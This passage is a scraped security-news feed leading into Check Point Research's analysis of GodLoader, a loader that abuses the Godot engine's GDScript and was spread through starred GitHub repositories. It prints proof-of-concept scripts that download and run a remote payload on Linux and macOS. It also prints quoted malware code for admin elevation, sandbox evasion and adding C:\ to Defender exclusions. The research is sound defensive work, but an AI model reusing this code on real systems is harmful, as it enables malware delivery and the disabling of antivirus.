&lt;li&gt;Jenkins has &lt;a href="https://www.jenkins.io/security/advisory/2024-11-27/"&gt;published&lt;/a&gt; a security advisory addressing vulnerabilities in its products. Two of the vulnerabilities addressed are classified as high severity: CVE-2024-47855 which allowed denial of service in Jenkins core, and CVE-2024-54003, a stored cross-site scripting vulnerability affecting Simple Queue Plugin.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2024/gaming-engines-an-undetected-playground-for-malware-loaders/"&gt;uncovered&lt;/a&gt; a novel method by which cybercriminals exploit the Godot Engine—a popular open-source game development platform—to execute malicious GDScript code. This technique enables attackers to deliver malware across multiple platforms, including Windows, macOS, Linux, Android, and iOS, while evading detection by most antivirus solutions. Malicious loader, dubbed &amp;#8220;GodLoader&amp;#8221;, which is using this technique has been active since at least June 2024, and is believed to have already infected over 17,000 machines. The distribution of the malware was facilitated through the &amp;#8220;Stargazers Ghost Network,&amp;#8221; a GitHub-based malware-as-a-service operation that leverages numerous repositories and stargazers to lend legitimacy to the malicious content.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;Researchers &lt;a href="https://www.trendmicro.com/en_us/research/24/k/earth-estries.html"&gt;reported&lt;/a&gt; that China-linked APT group, Salt Typhoon, has been targeting Southeast Asian telecommunications firms with a sophisticated new backdoor named GhostSpider. The group exploits web vulnerabilities for initial access and uses legitimate tools for lateral movement, and the malware&amp;#8217;s modular design allows independent updates, complicating detection and analysis.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.welivesecurity.com/en/eset-research/romcom-exploits-firefox-and-windows-zero-days-in-the-wild/"&gt;found&lt;/a&gt; that Russia-linked group RomCom has exploited two zero-day vulnerabilities in Firefox and Windows to target victims in Europe and North America. The flaws, CVE-2024-9680 in Firefox and CVE-2024-49039 in Windows Task Scheduler, were chained to achieve remote code execution without user interaction. Victims were redirected to malicious websites, leading to the deployment of the RomCom backdoor for further payloads and command execution.&lt;/li&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2024/gaming-engines-an-undetected-playground-for-malware-loaders/"&gt;Gaming Engines: An Undetected Playground for Malware Loaders&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h1 class="wp-block-heading"&gt;Key Points&lt;/h1&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Check Point Research discovered a new technique taking advantage of Godot Engine, a popular open-source game engine, to execute crafted GDScript, code which triggers malicious commands and delivers malware. The technique remains undetected by almost all antivirus engines in VirusTotal. &lt;/li&gt;



&lt;li&gt;Check Point identified GodLoader&lt;strong&gt;,&lt;/strong&gt; a loader that employs this new technique. The threat actor behind this malware has been utilizing it since June 29, 2024, infecting over 17,000 machines &lt;/li&gt;



&lt;li&gt;The malicious GodLoader is distributed by the &lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/" rel="noreferrer noopener" target="_blank"&gt;Stargazers Ghost Network&lt;/a&gt;, a GitHub network that distributes malware as a service. Throughout September and October, approximately 200 repositories and over 225 Stargazers were used to legitimize the repositories distributing the malware. &lt;/li&gt;



&lt;li&gt;This new technique allows threat actors to target and infect devices across multiple platforms, such as Windows, macOS, Linux, Android, and iOS. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt; &lt;/strong&gt;Check Point Research demonstrates how this multi-platform technique can successfully drop payloads in Linux and MacOS. &lt;/li&gt;



&lt;li&gt;A potential attack can target over 1.2 million users of Godot-developed games. These scenarios involve taking advantage of legitimate Godot executables to load malicious scripts in the form of mods or other downloadable content. &lt;/li&gt;
&lt;/ul&gt;



&lt;h1 class="wp-block-heading"&gt;Introduction&lt;/h1&gt;



&lt;p&gt;Cybercriminals constantly try to evolve their tactics and techniques, aiming to increase infections. Their need to stay undetected pushes them to innovate and discover new methods of delivering and executing malicious code, which can result in credentials theft and even ransomware encryption. Check Point Research discovered a new undetected technique that uses Godot Gaming Engine to execute malicious GDScript code.&lt;/p&gt;



&lt;p&gt;Godot Engine is an open-source, feature-rich game development platform designed for creating 2D and 3D games known for its flexibility, user-friendly interface, and comprehensive set of tools. Godot allows developers to export games to various platforms, including Windows, macOS, Linux, Android, iOS, HTML5 (Web), and more, making it versatile for different audiences. The engine uses a Python-like scripting language called GDScript, explicitly designed for game development. It also supports VisualScript and C# for developers familiar with Microsoft’s programming ecosystem.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Godot has a vibrant and growing community of developers who value its open-source nature and powerful capabilities. Over 2,700 developers contributed to the Godot gaming engine, while more than 1,550 supporters donate approximately $61,500 each month to the Development Fund&lt;strong&gt;, &lt;/strong&gt;ensuring the future of the Godot engine. On platforms like Discord, YouTube, and other social media platforms, the Godot engine has around 80,000 followers who stay updated on the latest news.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Since at least June 29, 2024&lt;strong&gt;,&lt;/strong&gt; cybercriminals have been taking advantage of Godot Engine to execute crafted GDScript code which triggers malicious commands and delivers malware. This technique has remained undetected by most Antivirus tools on VirusTotal, possibly infecting more than 17,000 machines in just a few months. The loader using this novel technique, GodLoader, has been distributed throughout September and October via the &lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/" rel="noreferrer noopener" target="_blank"&gt;Stargazers Ghost Network&lt;/a&gt;. This network operates as a Distribution as a Service (DaaS), enabling the “legitimate” distribution of malware through GitHub repositories. &lt;/p&gt;



&lt;p&gt;For the distribution of GodLoader, approximately 200 repositories and more than 225 Stargazer Ghost accounts were used. These accounts have been starring the malicious repositories that distribute GodLoader, making them appear legitimate and safe. The repositories were released in four separate waves, primarily targeting developers, gamers, and general users. The waves of attacks occurred on the following dates:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;2024-09-12&lt;/li&gt;



&lt;li&gt;2024-09-14&lt;/li&gt;



&lt;li&gt;2024-09-29&lt;/li&gt;



&lt;li&gt;2024-10-03&lt;/li&gt;
&lt;/ol&gt;



&lt;h1 class="wp-block-heading"&gt;New Technique &amp;#8211; Technical Analysis&lt;/h1&gt;



&lt;p&gt;Godot uses .pck (pack) files to bundle game assets and resources, such as scripts, scenes, textures, sounds, and other data. The game can load these files dynamically, allowing developers to distribute updates, downloadable content (DLC), or additional game assets without modifying the core game executable. These pack files might contain elements related to the games, images, audio files, and any other “static” files. In addition to these static files, .pck files can include scripts written in GDScript (.gd). These scripts can be executed when the .pck is loaded using the built-in callback function _ready(), allowing the game to add new functionality or modify existing behavior.&lt;/p&gt;



&lt;p&gt;Godot Engine provides an execution environment for GDScript, enabling game developers to create game-play logic, control scenes, and interact with game objects. GDScript includes most modern language features, including object support and multi-threading.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Threat actors take advantage of Godot engine and GDScript, which use this new technique to execute malicious code, download malware, and deploy it while remaining undetected. As GDScript is a fully functional language, it offers threat actors many functionalities, from Anti-Sandbox and Anti-VM to executing remote payloads. Threat actors maliciously craft GDScript code and then load it with a loader utilizing the Godot Engine. While we have obtained Windows samples, this technique can also be used for cross-platform infections. The Godot Engine executable and the maliciously crafted GDScript are system-dependent when interacting with the operating system (OS).&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Pack files can be separate files with a .pck extension or embedded inside the binary as a .pck section. Either way, the process loads the file/section and decrypts the encrypted (recommended by Godot documentation), and the engine executes the GDScripts. Initial samples obtained contained the pack file embedded and decrypted, while subsequent samples started using external pack files and encryption.&amp;nbsp;&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30767" height="377" src="https://research.checkpoint.com/wp-content/uploads/2024/11/1-1024x377.png" title="" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1 &amp;#8211; Technique analysis.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The Pack file structure, as shown below, contains the .pck headers, information about each packed file, and its contents. The contents are encrypted if the author specified an AES key during the build. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30769" height="404" src="https://research.checkpoint.com/wp-content/uploads/2024/11/2-1.png" width="547" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2 &amp;#8211; Pack file &lt;/em&gt;&lt;a href="https://github.com/Bioruebe/godotdec" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;structure&lt;/em&gt;&lt;/a&gt;&lt;em&gt;.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h1 class="wp-block-heading"&gt;Cross-platform God&lt;strong&gt;Loader&lt;/strong&gt;&lt;/h1&gt;



&lt;p&gt;The Godot game engine allows developers to export their projects to various platforms, as explained in the Godot Engine guidelines:&amp;nbsp;&lt;/p&gt;



&lt;p&gt;“&lt;em&gt;Games can be exported with one click to a number of platforms, including the major desktop platforms (Linux, macOS, Windows), mobile platforms (Android, iOS), as well as Web-based platforms and consoles.”&lt;/em&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Cross-platform support allows threat actors to export GodLoader with minor OS changes to other platforms.&lt;/p&gt;



&lt;p&gt;While our initial discovery targeted Windows machines, Check Point Research assessed the ease of developing loaders for platforms beyond Windows. The simplicity of creating loaders is largely dependent on the target platform, as most core loader functionality relies on other executables and the operating system itself. The Godot Engine primarily functions as an execution environment for GDScript code. This technique can be demonstrated by using the original version of Godot on Linux and MacOS. An Android loader also seems possible but requires modifications to the Godot Engine. However, an iOS version is unlikely due to Apple’s strict App Store policies, which would make deployment challenging.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Both the macOS and Linux proof of concepts (POCs) operate similarly to the original Windows loader. They each feature a button that, when clicked by the user, triggers the download and execution of a payload. For demonstration purposes, we chose to launch the calculator as the payload.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Linux POC&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;GDScript Linux POC&lt;/strong&gt; code:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;func _linux_do()  -&gt; void:
	print("linux do enter ...")
	var cat_out = []
	var pay_out = "/tmp/l.sh"
	OS.execute("wget", ["-O", pay_out, "&amp;lt;http://192.168.56.103:9000/l.sh&gt;"], cat_out)
	OS.execute("chmod", ["+x", pay_out], cat_out, true)
	OS.execute(pay_out, [], cat_out, true)
	OS.execute("rm", [pay_out], cat_out, true)
	print(cat_out)
	print("linux do  exit ...")
&lt;/pre&gt;



&lt;p&gt;Code of &lt;strong&gt;Linux payload&lt;/strong&gt;:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;#!/bin/sh
/usr/bin/galculator
&lt;/pre&gt;






&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30771" height="319" src="https://research.checkpoint.com/wp-content/uploads/2024/11/3-1.gif" width="922" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 3 &amp;#8211; Linux POC.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading"&gt;MacOS POC&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;MacOS GDScript&lt;/strong&gt; &lt;strong&gt;POC&lt;/strong&gt; code:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;func _mac_do()  -&gt; void:
	print("mac do enter ...")
	var cat_out = []
	var pay_out = "/tmp/c.sh"
	OS.execute("/opt/homebrew/bin/wget", ["-O", pay_out, "&amp;lt;http://192.168.15.10:9000/c.sh&gt;"], cat_out, true)
	OS.execute("chmod", ["+x", pay_out], cat_out, true)
	OS.execute(pay_out, [], cat_out, true)
	OS.execute("rm", [pay_out],  cat_out, true)
	print(cat_out)
	print("mac do  exit ...")
&lt;/pre&gt;



&lt;p&gt;&lt;strong&gt;MacOS&lt;/strong&gt; payload:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;#!/bin/zsh
open -a Calculator
&lt;/pre&gt;






&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30772" height="228" src="https://research.checkpoint.com/wp-content/uploads/2024/11/4.gif" width="1031" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 4 &amp;#8211; MacOS POC.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h1 class="wp-block-heading"&gt;Stargazers Ghost Network Campaigns Distributing GodLoader&lt;/h1&gt;



&lt;p&gt;&lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/" rel="noreferrer noopener" target="_blank"&gt;Stargazers Ghost Network&lt;/a&gt; delivers all sorts of malware with high infection rates, providing a new and successful method for gaining initial access. Recently, Check Point Research discovered GodLoader, distributed across multiple repositories and primarily targets developers and gamers. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30773" height="687" src="https://research.checkpoint.com/wp-content/uploads/2024/11/5-1024x687.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 5 &amp;#8211; Repository distributing loader.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The campaign began on &lt;strong&gt;October 3, 2024,&lt;/strong&gt; using &lt;strong&gt;100&lt;/strong&gt; unique repositories. It distributed an archive containing two files: 1) &lt;code&gt;Launcherkks.exe&lt;/code&gt; and 2) &lt;code&gt;Launcherkks.pck&lt;/code&gt;. Each repository was starred by one to twelve accounts and utilized the &lt;a href="https://github.com/apps/github-actions" rel="noreferrer noopener" target="_blank"&gt;github-actions[bot]&lt;/a&gt; to update the &lt;strong&gt;LOG&lt;/strong&gt; with the current date and time. This strategy appears to enhance the visibility of the repositories in GitHub searches, making them appear as the most recently updated ones.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30774" height="722" src="https://research.checkpoint.com/wp-content/uploads/2024/11/6.png" style="width: 667px; height: auto;" width="743" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 6 &amp;#8211; Malicious release.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The downloaded RAR archive, which was not password protected, had a unique random name. The Stargazers Ghost Network had distributed the same archive in previous campaigns on September 12, September 14, and September 29, 2024. Check Point Research discovered over 196 repositories distributing the malicious GodLoader, with more than 225 stargazers having starred these repositories. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30775" height="520" src="https://research.checkpoint.com/wp-content/uploads/2024/11/7-1024x407.png" width="1307" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 7 &amp;#8211; Archive undetected by all anti-virus engines on VirusTotal.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;As of October 8, 2024, the distributed archive and the embedded files appear undetected by all the major Antivirus engines. Considering this technique has existed in the wild since at least June 29, 2024&lt;strong&gt;,&lt;/strong&gt; it poses a danger for all kinds of users. &lt;code&gt;Laucnherkks.exe&lt;/code&gt; loads the &lt;code&gt;.pck&lt;/code&gt; file with the same name and decrypts the Pack File containing the malicious GDScript, downloading the next-stage payload.&lt;/p&gt;



&lt;p&gt;Across other data, the Pack File stores the MD5 hash. Enumerating the .pck entries with a simple Python script gives us the following hashes: &lt;/p&gt;

&lt;p&gt;The malicious GDScript is found and executed by the file &lt;code&gt;control.gd&lt;/code&gt;. The script employs various anti-sandbox and emulation techniques before downloading and executing two executable files from bitbucket.org. It also includes two comments written in Russian, which could indicate the author’s country of origin. &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;# Закрываем текущее окно&lt;/code&gt;, &lt;em&gt;“Close the current window”&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;# Закрываем приложение после показа сообщения&lt;/code&gt;, &lt;em&gt;“Close the application after showing the message”&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;code&gt;GDScript&lt;/code&gt; flow contains the following pieces in order to succeed:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;code to evade analysis in &lt;strong&gt;sandbox, anti-sandbox&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;code to evade detection of malicious payload by &lt;strong&gt;Microsoft Defender&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;code to download the payload and execute it&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The high-level flow of the script looks like this:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30776" height="263" src="https://research.checkpoint.com/wp-content/uploads/2024/11/8-1024x263.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 8 &amp;#8211; GDScript flow.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Sandbox evasion is achieved by checking if the 3D Video Acceleration feature is available. The following piece of code forces the Godot engine to use 3D Video Accelerations:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;func request_admin_privileges():
	var godot_executable = OS.get_executable_path()
	var godot_args = OS.get_cmdline_args()
	
	if "--rendering-driver opengl3" not in godot_args:
		godot_args.append("--rendering-driver")
		godot_args.append("opengl3")
	
	godot_args.append("--admin-requested")
	
	var args_string = " ".join(godot_args)
	
	var ps_command = """
	Start-Process -FilePath '%s' -ArgumentList '%s' -Verb RunAs
	""" % [godot_executable, args_string]
	
	var args = PackedStringArray(["-Command", ps_command])
	
	var output = []
	var exit_code = OS.execute("powershell.exe", args, output, true)
	
	if exit_code == 0:
		get_tree().quit()  # Закрываем текущее окно
	else:
		show_windows_message_box()
&lt;/pre&gt;



&lt;p&gt;If 3D acceleration hardware is not present in the system, then the application terminates with the following message:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30777" height="211" src="https://research.checkpoint.com/wp-content/uploads/2024/11/9.png" width="388" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 9 &amp;#8211; GodLoader 3D Acceleration message.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Another anti-sandbox technique creates a graphical button that, once clicked, proceeds to infect potential victims.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;While inspecting GodLoader, we identified a few sandbox evasion techniques. One technique uses a 3D Video Graphics adapter name to check if it is running in a virtual environment:&amp;nbsp;&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;func _on_gpu_check_completed(gpu_names: Array):
	var success = false
	for name in gpu_names:
		var gpu_name_lower = name.to_lower()
		if (gpu_name_lower.find("nvidia") != -1 or 
			gpu_name_lower.find("amd") != -1 or
			gpu_name_lower.find("radeon") != -1 or 
			gpu_name_lower.find("rx") != -1):
			success = true
			break

	if success:
		text = "WAIT. UPDATING..."
		_start_execution()
	else:
		show_message_box("Outdated, wait for the update", "Warning")
		_finish_execution(false)

func get_gpu_names() -&gt; Array:
	var output = []
	var ps_command = 'Get-WmiObject -Class Win32_VideoController | ForEach-Object { $_.Name }'
	
	var args = ["-Command", ps_command]
	var exit_code = OS.execute("powershell.exe", args, output, true)
	
	var gpu_names = []
	for line in output:
		var gpu_name = line.strip_edges()
		if not gpu_name.is_empty():
			gpu_names.append(gpu_name)
	
	return gpu_names

func _check_gpu_in_thread():
	var gpu_names = get_gpu_names()
	call_deferred("_on_gpu_check_completed", gpu_names)
&lt;/pre&gt;



&lt;p&gt;This code segment retrieves all video controller names installed in the system. It then checks whether these names contain any predefined strings. If none of the strings match, the script aborts the infection process.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Another evasion technique uses the size of available free space to identify the virtual environment:&amp;nbsp;&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;func _check_space_in_thread():
    var total_space_gb = get_total_free_space_gb()
    call_deferred("_on_space_check_completed", total_space_gb)

func _on_space_check_completed(total_space_gb: float):
    is_executing = false
    if total_space_gb &gt; 360:
        add_folder_to_windows_defender_exclusions()
        _start_execution()
    else:
        show_message_box("Outdated, wait for the update", "Warning")

func get_total_free_space_gb() -&gt; float:
    var cmd = 'powershell -Command "Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -gt 0 } | Measure-Object -Property Free -Sum | Select-Object -ExpandProperty Sum"'
    var result = []
    var exit_code = OS.execute("cmd", ["/c", cmd], result, true)
    
    if exit_code == 0:
        var output = ""
        for line in result:
            output += line + "\\n"
        output = output.strip_edges()
        
        var space_bytes = output.to_float()
        
        if space_bytes &gt; 0 or output == "0":
            var space_gb = space_bytes / 1_073_741_824.0
            return space_gb
        else:
            return -1.0
    else:
        return -1.0
&lt;/pre&gt;



&lt;p&gt;Both of these techniques use &lt;code&gt;powershell.exe&lt;/code&gt; to retrieve system properties.&lt;/p&gt;



&lt;p&gt;As demonstrated in the code snippet, admin privileges are checked within the same function. In the next step, the script attempts to add the entire &lt;code&gt;C:\\&lt;/code&gt; disk to the Microsoft Defender exclusions list: &lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;var ps_command = """
Add-MpPreference -ExclusionPath 'C:\\\\';
"""
var args = PackedStringArray(["-Command", ps_command])
	
var output = []
OS.execute("powershell.exe", args, output, true)
&lt;/pre&gt;



&lt;p&gt;Subsequently, the script attempts to download and execute payload files sequentially. Interestingly, the downloaded payloads were hosted on &lt;code&gt;bitbucket.org&lt;/code&gt;, a legitimate code collaboration and project management platform. The two payloads were uploaded on June 29 and August 7, 2024. The oldest sample appears to have been downloaded more than &lt;strong&gt;17,000&lt;/strong&gt; times, indicating the number of potential victims. Searching for more GodLoader samples, &lt;strong&gt;Check Point Research&lt;/strong&gt; considers this exploitation to be the first time it has been used, with the first campaign occurring on 2024-06-29. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30778" height="243" src="https://research.checkpoint.com/wp-content/uploads/2024/11/10-1024x243.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 10 &amp;#8211; Bitbucket malicious downloads.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The earliest and most frequently downloaded file, &lt;code&gt;Updatemmmm.exe&lt;/code&gt;, is the miner &lt;strong&gt;XMRig&lt;/strong&gt;&lt;span style="margin: 0px; padding: 0px;"&gt;&lt;strong&gt;.&lt;/strong&gt; &lt;/span&gt;The file uploaded on August 7, 2024, &lt;code&gt;UpdateSSSS.exe&lt;/code&gt; was updated three times with three different hashes corresponding to this filename.&lt;/p&gt;

&lt;/ol&gt;



&lt;figure class="wp-block-table is-style-regular"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Hash&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;File&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;B1A351EE61443B8558934DCA6B2FA9EFB0A6D2D18BAE61ACE5A761596604DBFA&lt;/td&gt;&lt;td&gt;asdz2.png (XMRig)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;B1A351EE61443B8558934DCA6B2FA9EFB0A6D2D18BAE61ACE5A761596604DBFA&lt;/td&gt;&lt;td&gt;Updatemmmm.exe (XMRig)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;6BE9C015C82645A448831D9DC8FCAE4360228F76DFF000953A76E3BF203D3EC8&lt;/td&gt;&lt;td&gt;sdadsasad.png (1st RedLine)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;604FA32B76DBE266DA3979B7A49E3100301DA56F0B58C13041AB5FEBE55354D2&lt;/td&gt;&lt;td&gt;UpdateSSSS.exe (last RedLine)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;For more than three months, the threat actor hosted malicious files on a legitimate platform that remained undetected for an extended period, infecting more than &lt;strong&gt;17,000&lt;/strong&gt; victims. During this period, the threat actor made very few modifications and only changed the C&amp;amp;C twice, which is an impressive amount of time spent running a C&amp;amp;C of a known and well-tracked malware family. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30779" height="418" src="https://research.checkpoint.com/wp-content/uploads/2024/11/11-1024x418.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 11 &amp;#8211; Attack chain using the Stargazers Ghost Network and Godot GDscript.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The &lt;strong&gt;XMRig&lt;/strong&gt; miner reached a private paste in &lt;code&gt;pastebin&lt;/code&gt; to retrieve its configuration. The private paste 7bG9giRJ uploaded on May 10, 2024, containing the &lt;strong&gt;XMRig &lt;/strong&gt;configuration related to the campaign, has been visited &lt;strong&gt;206,913&lt;/strong&gt; times. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30780" height="316" src="https://research.checkpoint.com/wp-content/uploads/2024/11/12.png" width="1013" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 12 &amp;#8211; XMRig configuration paste.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The account &lt;code&gt;&lt;code&gt;@&lt;/code&gt;SKRASH1&lt;/code&gt; behind this paste also appears to have some public configurations, with the earliest being December 10, 2021. According to these configurations, the threat actor primarily owns &lt;strong&gt;Monero&lt;/strong&gt; and &lt;strong&gt;Ethereum,&lt;/strong&gt; which is not surprising for Cybercriminals. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30781" height="402" src="https://research.checkpoint.com/wp-content/uploads/2024/11/13-1024x402.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 13 &amp;#8211; Threat actor’s public pastes.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h1 class="wp-block-heading"&gt;God&lt;strong&gt;Loader&lt;/strong&gt; Evolution&lt;/h1&gt;



&lt;p&gt;Since June 29, 2024, the malware GodLoader has transitioned from containing an embedded &lt;code&gt;.pck&lt;/code&gt; file as a PE section to having it as a separate file and from being decrypted to encrypted. The main functionality is concentrated inside the &lt;code&gt;.pck&lt;/code&gt; segment of the Godot executable. The Pack file could be transported separately or in sections inside the executable. While the main evolution of malicious code happens within the &lt;code&gt;.pck&lt;/code&gt; file, in later stages, the actor also attempted to improve the evasion level and encrypt the &lt;code&gt;.pck&lt;/code&gt; file. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30782" height="523" src="https://research.checkpoint.com/wp-content/uploads/2024/11/14-1024x523.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 14 – GodLoader’s evolution timeline.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The earliest GDScript related to GodLoader is dated June 29, 2024. This variant appears to be nearly finalized. The script contains the code to: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Check for granted Administrator Rights and request them if they are not granted&lt;/li&gt;



&lt;li&gt;Add &lt;code&gt;c:\\&lt;/code&gt; to the MS Defender exclusions list&lt;/li&gt;



&lt;li&gt;Download and execute a payload&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Later, the threat actor begins to experiment with evasion techniques.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;One notable aspect of this initial version is the small details the author did not clarify; for instance, the warning dialog requesting the user to grant Admin Permissions is displayed with the title in Russian. The title translates as “warning”:&amp;nbsp;&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30783" height="152" src="https://research.checkpoint.com/wp-content/uploads/2024/11/15.png" width="281" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 15 &amp;#8211; Warning dialog box.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;A new variant was submitted to VirusTotal on June 30, 2024. In this variant, the actor added multi-threading: now, the payload is downloaded in a separate thread, and Russian text from the warning dialog was removed. &lt;/p&gt;



&lt;p&gt;On July 1, 2024, an additional variant of the Godot resource file was submitted to VirusTotal. This time, resources files were restructured: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Script code was copied from file &lt;code&gt;scn &lt;/code&gt;to file &lt;code&gt;gd&lt;/code&gt;.&lt;/li&gt;



